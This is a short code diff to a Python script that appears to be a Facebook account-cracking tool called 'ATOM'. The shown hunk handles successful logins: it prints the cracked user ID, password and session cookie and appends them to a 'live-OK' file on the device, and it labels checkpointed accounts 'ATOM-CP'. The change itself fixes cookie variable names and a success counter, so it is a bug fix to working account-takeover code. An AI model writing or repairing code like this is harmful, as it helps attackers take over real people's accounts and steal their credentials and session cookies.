@@ -1222,10 +1222,10 @@ def m4(idf,pwv):
                     res = requests.get(ckk).text
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
-                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
                             print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
-                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cooki4+'\n')
-                            ok.append(idf)
+                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok+=1
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
                             print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
